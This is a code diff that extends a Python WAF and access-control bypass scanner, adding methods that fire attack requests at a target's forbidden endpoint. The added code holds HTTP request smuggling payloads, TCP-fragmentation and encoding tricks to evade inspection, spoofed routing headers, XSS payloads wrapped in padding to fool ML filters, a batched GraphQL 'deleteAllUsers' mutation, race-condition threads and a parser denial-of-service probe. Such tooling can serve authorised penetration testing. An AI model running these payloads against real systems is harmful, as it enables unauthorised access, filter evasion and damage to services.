@@ -27,6 +27,9 @@ import random
 import string
 import socket
 import ssl
+import threading
+import gzip
+import queue
 from collections import defaultdict
 from datetime import datetime
 from urllib.parse import urlparse, urljoin
@@ -1122,16 +1125,41 @@ class DiscrepancyTester:
     Tests for parser discrepancies between stack layers.
     CRITICAL: Uses the REAL forbidden endpoint, not hardcoded paths!
     """
-    
+
     def __init__(self, target_url: str, forbidden_endpoint: str, session: requests.Session, stack_analyzer: ProgressiveStackAnalyzer):
         self.target_url = target_url.rstrip('/')
         self.forbidden_endpoint = forbidden_endpoint
         self.session = session
         self.stack_analyzer = stack_analyzer
         self.discrepancies = []
+
+        # Additional attributes for advanced tests
+        self.parsed_url = urlparse(target_url)
+        self.discovered_forbidden_endpoint = forbidden_endpoint
+        self.skip_forbidden_tests = not forbidden_endpoint
+        self.protocols = {
+            'http3': False,  # Will be detected during analysis
+            'http2': False,
+            'http1': True
+        }
+        self.chain_map = {'discrepancies': self.discrepancies}  # Alias for compatibility
+
+    def generate_unique_markers(self) -> Dict[str, str]:
+        """Generate unique markers for tracking requests"""
+        import uuid
+        return {
+            'uuid': str(uuid.uuid4()),
+            'timestamp': str(int(time.time())),
+            'random': ''.join(random.choices(string.ascii_letters, k=16))
+        }
+
+    def log_discovery(self, category: str, subcategory: str, message: str):
+        """Log discovery information"""
+        timestamp = time.strftime('%H:%M:%S')
+        print(f"    [{timestamp}] [{category}:{subcategory}] {message}")
     
     def test_all_discrepancies(self):
-        """Run all discrepancy tests on the REAL forbidden endpoint - EXPANDED"""
+        """Run all discrepancy tests on the REAL forbidden endpoint - FULLY EXPANDED"""
         print("\n🧪 Phase 3: Parser Discrepancy Testing")
         print("=" * 70)
 
@@ -1142,14 +1170,43 @@ class DiscrepancyTester:
         print(f"  🎯 Target: {self.forbidden_endpoint}")
         print(f"  📊 Testing against reconstructed stack: {len(self.stack_analyzer.stack['layers'])} layers")
 
-        # Run all discrepancy test categories (EXPANDED: 7 categories)
-        self.test_header_confusion()
-        self.test_method_confusion()
-        self.test_path_normalization()
-        self.test_protocol_confusion()
-        self.test_encoding_confusion()
-        self.test_content_type_confusion()  # NEW
-        self.test_host_header_attacks()     # NEW
+        # Original tests
+        discrepancy_tests = [
+            self.test_http_smuggling,
+            self.test_unicode_confusion,
+            self.test_encoding_discrepancies,
+            self.test_header_confusion,
+            self.test_method_confusion,
+            self.test_path_normalization,
+            self.test_parameter_pollution,
+            self.test_tcp_fragmentation,
+            self.test_compression_bomb,
+            self.test_timing_race_conditions,
+            # New advanced tests
+            self.test_parser_state_confusion,
+            self.test_buffer_boundary_discrepancies,
+            self.test_nested_encoding_confusion,
+            self.test_protocol_tunneling_discrepancies,
+            self.test_cache_key_confusion,
+            self.test_parser_backtracking_dos,
+            self.test_integer_overflow_length,
+            self.test_toctou_race_conditions,
+            self.test_quic_http3_confusion,
+            self.test_ml_waf_evasion,
+            self.test_container_orchestration_bypass,
+            self.test_graphql_rest_confusion,
+            # Additional tests from earlier version
+            self.test_protocol_confusion,
+            self.test_encoding_confusion,
+            self.test_content_type_confusion,
+            self.test_host_header_attacks
+        ]
+
+        for test in discrepancy_tests:
+            try:
+                test()
+            except Exception as e:
+                print(f"  ❌ Error in {test.__name__}: {str(e)}")
 
         print(f"\n  📊 Total discrepancies found: {len(self.discrepancies)}")
         return self.discrepancies
@@ -1428,6 +1485,841 @@ class DiscrepancyTester:
                     print(f"    ✅ Discrepancy found: {headers} → {response.status_code}")
             except Exception as e:
                 pass
+
+    # Advanced Discrepancy Tests
+    def test_parser_state_confusion(self):
+        """Test parser state machine desynchronization"""
+        print("  🔄 Testing Parser State Machine Confusion...")
+
+        # HTTP/2 Pseudo-Header Injection
+        try:
+            headers = {
+                ':method': 'GET',
+                ':path': '/admin',
+                ':authority': 'internal.backend',
+                ':scheme': 'https',
+                'x-override-method': 'POST'
+            }
+
+            response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)
+
+            if response.status_code != 400:  # Should fail with pseudo-headers in HTTP/1.1
+                discrepancy = {
+                    'type': 'Parser State Confusion',
+                    'subtype': 'H2 Pseudo-Header Injection',
+                    'description': 'HTTP/2 pseudo-headers accepted in HTTP/1.1 context',
+                    'headers': headers,
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "Parser State", "H2 pseudo-header confusion")
+        except:
+            pass
+
+        # WebSocket Upgrade State Confusion
+        try:
+            ws_headers = {
+                'Upgrade': 'websocket',
+                'Connection': 'Upgrade',
+                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
+                'Sec-WebSocket-Version': '13'
+            }
+
+            response1 = self.session.get(self.forbidden_endpoint, headers=ws_headers, timeout=2)
+            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
+            response2 = self.session.get(test_endpoint, timeout=2)
+
+            if response2.status_code == 200:
+                discrepancy = {
+                    'type': 'Parser State Confusion',
+                    'subtype': 'WebSocket State Leak',
+                    'description': 'Parser state leaked between WebSocket and HTTP',
+                    'evidence': 'Admin path accessible after WebSocket attempt'
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "Parser State", "WebSocket state leak")
+        except:
+            pass
+
+    def test_buffer_boundary_discrepancies(self):
+        """Test buffer boundary confusion"""
+        print("  📊 Testing Buffer Boundary Discrepancies...")
+
+        # Header Buffer Boundary Test
+        try:
+            large_header_value = 'A' * 8192
+            headers = {
+                'X-Large-Header': large_header_value[:8000],
+                'X-Secret': 'admin'
+            }
+
+            response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)
+
+            if response.status_code in [200, 413, 431]:
+                discrepancy = {
+                    'type': 'Buffer Boundary',
+                    'subtype': 'Header Buffer Overflow',
+                    'description': 'Headers at 8KB boundary processed differently',
+                    'buffer_size': 8192,
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "Buffer Boundary", "8KB header boundary")
+        except:
+            pass
+
+        # URL Length Boundary Test
+        try:
+            for size in [2048, 4096, 8192]:
+                long_path = '/' + 'A' * (size - 20) + '/../admin'
+                response = self.session.get(f"{self.target_url}{long_path}", timeout=5)
+
+                if response.status_code != 414:
+                    discrepancy = {
+                        'type': 'Buffer Boundary',
+                        'subtype': 'URL Length Limit',
+                        'description': f'URL accepted at {size} bytes',
+                        'buffer_size': size,
+                        'response_code': response.status_code
+                    }
+                    self.chain_map['discrepancies'].append(discrepancy)
+                    self.log_discovery("Discrepancy", "Buffer Boundary", f"{size} byte URL accepted")
+        except:
+            pass
+
+    def test_nested_encoding_confusion(self):
+        """Test nested encoding state stack confusion"""
+        print("  🔢 Testing Nested Encoding Confusion...")
+
+        # Mixed UTF-8 and UTF-16 BOM switching
+        try:
+            payload = b'\xef\xbb\xbf/admin\xff\xfe'
+            response = self.session.get(
+                self.forbidden_endpoint,
+                data=payload,
+                headers={'Content-Type': 'text/plain'},
+                timeout=5
+            )
+
+            if response.status_code != 400:
+                discrepancy = {
+                    'type': 'Nested Encoding',
+                    'subtype': 'BOM Switching',
+                    'description': 'Mixed BOM encoding accepted',
+                    'payload': 'UTF-8 BOM + /admin + UTF-16 BOM',
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "Encoding", "BOM switching accepted")
+        except:
+            pass
+
+        # Percent-Encoding in Different Bases
+        encoding_variations = [
+            ('Hex Standard', '/%61dmin'),
+            ('Octal', '/%0141dmin'),
+            ('Unicode IIS', '/%u0061dmin'),
+            ('Double Decimal', '/%%36%31dmin')
+        ]
+
+        for name, path in encoding_variations:
+            try:
+                response = self.session.get(f"{self.forbidden_endpoint}{path}", timeout=5)
+                if response.status_code == 200:
+                    discrepancy = {
+                        'type': 'Nested Encoding',
+                        'subtype': f'{name} Encoding',
+                        'description': f'{name} encoding decoded to /admin',
+                        'encoded_path': path,
+                        'response_code': response.status_code
+                    }
+                    self.chain_map['discrepancies'].append(discrepancy)
+                    self.log_discovery("Discrepancy", "Encoding", f"{name} encoding accepted")
+            except:
+                pass
+
+    def test_protocol_tunneling_discrepancies(self):
+        """Test protocol nesting confusion"""
+        print("  🔀 Testing Protocol Tunneling Discrepancies...")
+
+        # HTTP in HTTP (Absolute URI)
+        try:
+            response = self.session.request(
+                'GET',
+                f"{self.forbidden_endpoint}",
+                headers={
+                    'Host': 'public.site',
+                    'X-Original-URL': 'http://internal.backend/admin'
+                },
+                timeout=5
+            )
+
+            if 'admin' in response.text.lower() or response.status_code == 200:
+                discrepancy = {
+                    'type': 'Protocol Tunneling',
+                    'subtype': 'Absolute URI Confusion',
+                    'description': 'Internal URL accessible via header',
+                    'technique': 'X-Original-URL header',
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "Protocol Tunneling", "Absolute URI confusion")
+        except:
+            pass
+
+        # Multiple Protocol Upgrades
+        try:
+            headers = {
+                'Upgrade': 'websocket, h2c, spdy/3.1',
+                'Connection': 'Upgrade'
+            }
+
+            response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)
+
+            if response.status_code not in [400, 426]:
+                discrepancy = {
+                    'type': 'Protocol Tunneling',
+                    'subtype': 'Multiple Upgrade Confusion',
+                    'description': 'Multiple protocol upgrades not rejected',
+                    'protocols': 'websocket, h2c, spdy/3.1',
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "Protocol", "Multiple upgrades accepted")
+        except:
+            pass
+
+    def test_cache_key_confusion(self):
+        """Test cache key computation discrepancies"""
+        print("  🔑 Testing Cache Key Confusion...")
+
+        # Case Sensitivity Mismatch
+        case_variations = [
+            ('/ADMIN', 'example.com'),
+            ('/admin', 'EXAMPLE.COM'),
+            ('/Admin', 'Example.Com')
+        ]
+
+        responses = {}
+        for path, host in case_variations:
+            try:
+                response = self.session.get(
+                    f"{self.forbidden_endpoint}{path}",
+                    headers={'Host': host},
+                    timeout=5
+                )
+                key = f"{path}:{host}"
+                responses[key] = response.status_code
+            except:
+                pass
+
+        if len(set(responses.values())) > 1:
+            discrepancy = {
+                'type': 'Cache Key Confusion',
+                'subtype': 'Case Sensitivity',
+                'description': 'Different responses for case variations',
+                'responses': responses,
+                'unique_codes': len(set(responses.values()))
+            }
+            self.chain_map['discrepancies'].append(discrepancy)
+            self.log_discovery("Discrepancy", "Cache", f"Case sensitivity: {len(set(responses.values()))} different responses")
+
+        # Parameter Order Confusion
+        param_variations = [
+            '/?b=2&a=1',
+            '/?a=1&b=2',
+            '/?a=1&b=2&',
+            '/?a=1&amp;b=2'
+        ]
+
+        param_responses = {}
+        for params in param_variations:
+            try:
+                response = self.session.get(f"{self.forbidden_endpoint}{params}", timeout=5)
+                param_responses[params] = response.status_code
+            except:
+                pass
+
+        if len(set(param_responses.values())) > 1:
+            discrepancy = {
+                'type': 'Cache Key Confusion',
+                'subtype': 'Parameter Order',
+                'description': 'Parameter order affects caching',
+                'variations': param_responses
+            }
+            self.chain_map['discrepancies'].append(discrepancy)
+            self.log_discovery("Discrepancy", "Cache", "Parameter order matters")
+
+    def test_parser_backtracking_dos(self):
+        """Test parser algorithmic complexity"""
+        print("  ⏱️ Testing Parser Backtracking...")
+
+        # Nested Parameter Parsing Complexity
+        try:
+            nested_params = []
+            for i in range(5):
+                for j in range(5):
+                    for k in range(5):
+                        nested_params.append(f'p[{i}][{j}][{k}]=v')
+
+            complex_query = '&'.join(nested_params)
+
+            start_time = time.time()
+            response = self.session.get(
+                f"{self.forbidden_endpoint}/?{complex_query}",
+                timeout=10
+            )
+            elapsed = time.time() - start_time
+
+            if elapsed > 2:
+                discrepancy = {
+                    'type': 'Parser Complexity',
+                    'subtype': 'Nested Parameter DoS',
+                    'description': 'Nested parameters cause slow parsing',
+                    'processing_time': elapsed,
+                    'complexity': 'O(n³)',
+                    'param_count': len(nested_params)
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "Parser DoS", f"Slow parsing: {elapsed:.2f}s")
+        except:
+            pass
+
+    def test_integer_overflow_length(self):
+        """Test integer overflow in length calculations"""
+        print("  🔢 Testing Integer Overflow in Lengths...")
+
+        overflow_values = [
+            ('2^32', '4294967296'),
+            ('2^31', '2147483648'),
+            ('Negative', '-1'),
+            ('Scientific', '1e3'),
+            ('Hex', '0x100')
+        ]
+
+        for name, value in overflow_values:
+            try:
+                headers = {
+                    'Content-Length': value,
+                    'Transfer-Encoding': 'chunked'
+                }
+
+                response = self.session.post(
+                    self.forbidden_endpoint,
+                    headers=headers,
+                    data=b'test',
+                    timeout=5
+                )
+
+                if response.status_code not in [400, 411, 413]:
+                    discrepancy = {
+                        'type': 'Integer Overflow',
+                        'subtype': f'{name} Content-Length',
+                        'description': f'Non-standard length value accepted: {value}',
+                        'length_value': value,
+                        'response_code': response.status_code
+                    }
+                    self.chain_map['discrepancies'].append(discrepancy)
+                    self.log_discovery("Discrepancy", "Integer", f"{name} length: {value}")
+            except:
+                pass
+
+    def test_toctou_race_conditions(self):
+        """Test Time-of-Check vs Time-of-Use race conditions"""
+        print("  ⚡ Testing TOCTOU Race Conditions...")
+
+        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
+            print("    ⚠️ Skipping TOCTOU test - no forbidden endpoint available")
+            return
+
+        try:
+            results = []
+            test_endpoint = self.forbidden_endpoint or f"{self.target_url}/api/admin"
+
+            def race_request(delay):
+                time.sleep(delay)
+                try:
+                    resp = self.session.get(test_endpoint, timeout=3)
+                    results.append((delay, resp.status_code))
+                except:
+                    results.append((delay, 'error'))
+
+            threads = []
+            for delay in [0, 0.001, 0.01, 0.05]:
+                thread = threading.Thread(target=race_request, args=(delay,))
+                threads.append(thread)
+                thread.start()
+
+            for thread in threads:
+                thread.join()
+
+            status_codes = [r[1] for r in results if r[1] != 'error']
+            if len(set(status_codes)) > 1:
+                discrepancy = {
+                    'type': 'TOCTOU Race',
+                    'subtype': 'Async Validation',
+                    'description': 'Race condition in request validation',
+                    'timing_results': results,
+                    'unique_responses': len(set(status_codes))
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "TOCTOU", f"Race condition detected: {len(set(status_codes))} responses")
+        except:
+            pass
+
+    def test_quic_http3_confusion(self):
+        """Test QUIC/HTTP3 specific discrepancies"""
+        print("  🚀 Testing QUIC/HTTP3 Confusion...")
+
+        if self.protocols['http3']:
+            try:
+                headers = {
+                    'Alt-Used': 'evil.com:443',
+                    'Alt-Svc': 'h3-29=":443"; ma=86400'
+                }
+
+                response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)
+
+                if response.status_code == 200:
+                    discrepancy = {
+                        'type': 'QUIC/HTTP3',
+                        'subtype': 'Alt-Svc Manipulation',
+                        'description': 'Alt-Svc headers accepted and may affect routing',
+                        'headers': headers
+                    }
+                    self.chain_map['discrepancies'].append(discrepancy)
+                    self.log_discovery("Discrepancy", "QUIC", "Alt-Svc manipulation possible")
+            except:
+                pass
+
+    def test_ml_waf_evasion(self):
+        """Test ML-based WAF evasion techniques"""
+        print("  🤖 Testing ML WAF Evasion...")
+
+        # Adversarial Padding
+        try:
+            benign_tokens = ['user', 'login', 'welcome', 'dashboard', 'profile']
+            padding = ' '.join(random.choices(benign_tokens, k=100))
+            payload = f"{padding} <script>alert(1)</script> {padding}"
+
+            response = self.session.get(
+                f"{self.forbidden_endpoint}/?q={urllib.parse.quote(payload)}",
+                timeout=5
+            )
+
+            if response.status_code not in [403, 406]:
+                discrepancy = {
+                    'type': 'ML WAF Evasion',
+                    'subtype': 'Adversarial Padding',
+                    'description': 'Benign token padding may confuse ML models',
+                    'padding_size': len(padding),
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "ML Evasion", "Adversarial padding effective")
+        except:
+            pass
+
+        # Context Window Overflow
+        try:
+            pre_context = 'safe content ' * 200
+            malicious = '<img src=x onerror=alert(1)>'
+            post_context = ' safe content' * 200
+            full_payload = pre_context + malicious + post_context
+
+            response = self.session.post(
+                self.target_url,
+                data={'content': full_payload},
+                timeout=5
+            )
+
+            if response.status_code not in [403, 406]:
+                discrepancy = {
+                    'type': 'ML WAF Evasion',
+                    'subtype': 'Context Window Overflow',
+                    'description': 'Large context may exceed ML model window',
+                    'payload_size': len(full_payload),
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "ML Evasion", "Context window overflow")
+        except:
+            pass
+
+    def test_container_orchestration_bypass(self):
+        """Test container/orchestration layer bypasses"""
+        print("  🐳 Testing Container Orchestration Bypass...")
+
+        try:
+            test_endpoint = self.forbidden_endpoint or f"{self.target_url}/admin"
+
+            k8s_headers = {
+                'X-Forwarded-Host': 'admin-service.default.svc.cluster.local',
+                'X-Envoy-Decorator-Operation': 'admin-service.admin.svc.cluster.local/*',
+                'X-B3-TraceId': ''.join(random.choices('0123456789abcdef', k=32)),
+                'X-B3-SpanId': ''.join(random.choices('0123456789abcdef', k=16))
+            }
+
+            response = self.session.get(
+                test_endpoint,
+                headers=k8s_headers,
+                timeout=5
+            )
+
+            if response.status_code == 200:
+                discrepancy = {
+                    'type': 'Container Orchestration',
+                    'subtype': 'Service Mesh Headers',
+                    'description': 'K8s service mesh headers affect routing',
+                    'headers': k8s_headers,
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "K8s", "Service mesh header bypass")
+        except:
+            pass
+
+    def test_graphql_rest_confusion(self):
+        """Test GraphQL-REST gateway confusion"""
+        print("  📊 Testing GraphQL-REST Gateway Confusion...")
+
+        try:
+            graphql_in_rest = {
+                'path': '/api/users/1;query{admin{password}}',
+                'headers': {'Content-Type': 'application/json'}
+            }
+
+            response = self.session.get(
+                f"{self.forbidden_endpoint}{graphql_in_rest['path']}",
+                headers=graphql_in_rest['headers'],
+                timeout=5
+            )
+
+            if 'admin' in response.text or 'graphql' in response.text.lower():
+                discrepancy = {
+                    'type': 'GraphQL-REST Confusion',
+                    'subtype': 'REST to GraphQL Injection',
+                    'description': 'GraphQL query in REST endpoint',
+                    'injection_point': 'URL path parameter',
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "GraphQL", "REST-GraphQL boundary confusion")
+        except:
+            pass
+
+        # GraphQL Batching via REST
+        try:
+            batch_payload = {
+                'query': [
+                    'query { user { name } }',
+                    'mutation { deleteAllUsers }'
+                ]
+            }
+
+            response = self.session.post(
+                f"{self.target_url}/graphql",
+                json=batch_payload,
+                timeout=5
+            )
+
+            if response.status_code == 200:
+                discrepancy = {
+                    'type': 'GraphQL-REST Confusion',
+                    'subtype': 'Batch Query Injection',
+                    'description': 'GraphQL batching accepted via REST',
+                    'technique': 'Array of queries'
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "GraphQL", "Batch queries accepted")
+        except:
+            pass
+
+    def test_http_smuggling(self):
+        """Test for HTTP request smuggling vulnerabilities"""
+        print("  🔀 Testing HTTP Request Smuggling...")
+
+        smuggling_payloads = [
+            {
+                'headers': {
+                    'Content-Length': '13',
+                    'Transfer-Encoding': 'chunked'
+                },
+                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked',
+                    'Content-Length': '0'
+                },
+                'data': '1\r\nZ\r\n0\r\n\r\n'
+            }
+        ]
+
+        for i, payload in enumerate(smuggling_payloads):
+            try:
+                marker = self.generate_unique_markers()['uuid']
+                response = self.session.post(
+                    self.forbidden_endpoint,
+                    headers=payload['headers'],
+                    data=payload['data'].replace('internal', marker),
+                    timeout=5
+                )
+
+                if marker in response.text or response.status_code in [400, 413, 414]:
+                    discrepancy = {
+                        'type': 'HTTP Smuggling',
+                        'test_id': f'smuggling_{i}',
+                        'payload': payload,
+                        'response_code': response.status_code,
+                        'evidence': marker in response.text
+                    }
+                    self.chain_map['discrepancies'].append(discrepancy)
+                    self.log_discovery("Discrepancy", "HTTP Smuggling", f"Potential smuggling in test {i}")
+            except:
+                continue
+
+    def test_unicode_confusion(self):
+        """Test Unicode normalization discrepancies"""
+        print("  🧬 Testing Unicode Confusion...")
+
+        unicode_tests = [
+            {
+                'original': '/admin',
+                'nfc': '/admin',
+                'nfd': '/\u0061\u0300\u0064\u006D\u0069\u006E',
+                'confusables': '/αdmin',
+            },
+            {
+                'original': '/admin',
+                'zwsp': '/ad\u200Bmin',
+                'zwnj': '/ad\u200Cmin',
+                'zwj': '/ad\u200Dmin',
+            }
+        ]
+
+        for test_group in unicode_tests:
+            original = test_group['original']
+
+            for variant_name, variant_path in test_group.items():
+                if variant_name == 'original':
+                    continue
+
+                try:
+                    resp_original = self.session.get(f"{self.forbidden_endpoint}{original}")
+                    resp_variant = self.session.get(f"{self.forbidden_endpoint}{variant_path}")
+
+                    if resp_original.status_code != resp_variant.status_code:
+                        discrepancy = {
+                            'type': 'Unicode Confusion',
+                            'variant': variant_name,
+                            'original_path': original,
+                            'variant_path': variant_path,
+                            'original_code': resp_original.status_code,
+                            'variant_code': resp_variant.status_code
+                        }
+                        self.chain_map['discrepancies'].append(discrepancy)
+                        self.log_discovery("Discrepancy", "Unicode", f"{variant_name}: {resp_original.status_code} vs {resp_variant.status_code}")
+                except:
+                    continue
+
+    def test_encoding_discrepancies(self):
+        """Test multi-layer encoding discrepancies"""
+        print("  🔢 Testing Encoding Discrepancies...")
+
+        test_path = "/admin"
+        encoding_chains = [
+            {
+                'name': 'Double URL Encoding',
+                'path': urllib.parse.quote(urllib.parse.quote(test_path)),
+            },
+            {
+                'name': 'HTML Entity Encoding',
+                'path': ''.join(f'&#{ord(c)};' for c in test_path),
+            },
+            {
+                'name': 'Mixed Encoding',
+                'path': test_path.replace('a', '%61').replace('d', '&#100;'),
+            },
+            {
+                'name': 'Base64 Parameter',
+                'path': f"/?path={base64.b64encode(test_path.encode()).decode()}",
+            }
+        ]
+
+        try:
+            baseline = self.session.get(f"{self.forbidden_endpoint}{test_path}")
+        except:
+            return
+
+        for encoding in encoding_chains:
+            try:
+                response = self.session.get(f"{self.forbidden_endpoint}{encoding['path']}")
+
+                if response.status_code != baseline.status_code:
+                    discrepancy = {
+                        'type': 'Encoding Discrepancy',
+                        'encoding_name': encoding['name'],
+                        'encoded_path': encoding['path'],
+                        'baseline_code': baseline.status_code,
+                        'encoded_code': response.status_code
+                    }
+                    self.chain_map['discrepancies'].append(discrepancy)
+                    self.log_discovery("Discrepancy", "Encoding", f"{encoding['name']}: {baseline.status_code} vs {response.status_code}")
+            except:
+                continue
+
+    def test_parameter_pollution(self):
+        """Test parameter pollution discrepancies"""
+        print("  🔀 Testing Parameter Pollution...")
+
+        pollution_tests = [
+            "?param=value1&param=value2",
+            "?param=value1&PARAM=value2",
+            "?param[]=value1&param[]=value2",
+            "?param=value1&param%5b%5d=value2"
+        ]
+
+        responses = {}
+        for test in pollution_tests:
+            try:
+                response = self.session.get(f"{self.forbidden_endpoint}{test}")
+                responses[test] = response.status_code
+            except:
+                responses[test] = f"Error"
+
+        unique_responses = set(responses.values())
+        if len(unique_responses) > 1:
+            discrepancy = {
+                'type': 'Parameter Pollution',
+                'pollution_responses': responses,
+                'unique_responses': len(unique_responses)
+            }
+            self.chain_map['discrepancies'].append(discrepancy)
+            self.log_discovery("Discrepancy", "Parameter Pollution", f"Inconsistent parameter handling: {len(unique_responses)} different responses")
+
+    def test_tcp_fragmentation(self):
+        """Test TCP fragmentation bypass techniques"""
+        print("  🌊 Testing TCP Fragmentation Bypass...")
+
+        try:
+            import socket
+
+            target_host = self.parsed_url.hostname
+            target_port = 443 if self.parsed_url.scheme == 'https' else 80
+
+            request_part1 = b"GET /adm"
+            request_part2 = b"in HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n"
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            if self.parsed_url.scheme == 'https':
+                import ssl
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                sock = context.wrap_socket(sock, server_hostname=target_host)
+
+            sock.connect((target_host, target_port))
+            sock.send(request_part1)
+            time.sleep(0.01)
+            sock.send(request_part2)
+
+            response = sock.recv(4096).decode('utf-8', errors='ignore')
+            sock.close()
+
+            if "200 OK" in response or "admin" in response.lower():
+                discrepancy = {
+                    'type': 'TCP Fragmentation',
+                    'description': 'TCP fragmentation may bypass WAF inspection',
+                    'evidence': 'Fragmented request processed differently',
+                    'payload': {'part1': request_part1.decode('utf-8', errors='ignore'), 'part2': request_part2.decode('utf-8', errors='ignore')}
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "TCP Fragmentation", "Potential fragmentation bypass")
+        except:
+            pass
+
+    def test_compression_bomb(self):
+        """Test compression bomb bypass technique"""
+        print("  💣 Testing Compression Bomb Bypass...")
+
+        try:
+            large_payload = "A" * 10000
+            compressed_payload = gzip.compress(large_payload.encode())
+
+            headers = {
+                'Content-Encoding': 'gzip',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Content-Length': str(len(compressed_payload))
+            }
+
+            response = self.session.post(
+                self.forbidden_endpoint,
+                data=compressed_payload,
+                headers=headers,
+                timeout=10
+            )
+
+            if response.status_code in [200, 413, 414, 502]:
+                discrepancy = {
+                    'type': 'Compression Bypass',
+                    'description': 'Compression may affect WAF inspection',
+                    'compressed_size': len(compressed_payload),
+                    'uncompressed_size': len(large_payload),
+                    'ratio': len(large_payload) / len(compressed_payload),
+                    'response_code': response.status_code
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "Compression", f"Compression ratio: {discrepancy['ratio']:.1f}x")
+        except:
+            pass
+
+    def test_timing_race_conditions(self):
+        """Test timing-based parser race conditions"""
+        print("  ⏱️ Testing Timing Race Conditions...")
+
+        try:
+            import threading
+            import queue
+
+            results = queue.Queue()
+
+            def send_delayed_request(delay, request_data):
+                time.sleep(delay)
+                try:
+                    response = self.session.post(self.forbidden_endpoint, data=request_data, timeout=5)
+                    results.put(('success', response.status_code, delay))
+                except Exception as e:
+                    results.put(('error', str(e), delay))
+
+            test_data = "param=value&admin=true"
+            delays = [0, 0.001, 0.01, 0.1]
+
+            threads = []
+            for delay in delays:
+                thread = threading.Thread(target=send_delayed_request, args=(delay, test_data))
+                threads.append(thread)
+                thread.start()
+
+            for thread in threads:
+                thread.join()
+
+            timing_results = []
+            while not results.empty():
+                timing_results.append(results.get())
+
+            status_codes = [r[1] for r in timing_results if r[0] == 'success']
+            if len(set(status_codes)) > 1:
+                discrepancy = {
+                    'type': 'Timing Race Condition',
+                    'description': 'Timing affects request processing',
+                    'timing_results': timing_results,
+                    'unique_responses': len(set(status_codes))
+                }
+                self.chain_map['discrepancies'].append(discrepancy)
+                self.log_discovery("Discrepancy", "Timing Race", f"Timing-dependent responses: {len(set(status_codes))}")
+        except:
+            pass
 
 
 class BypassGenerator:
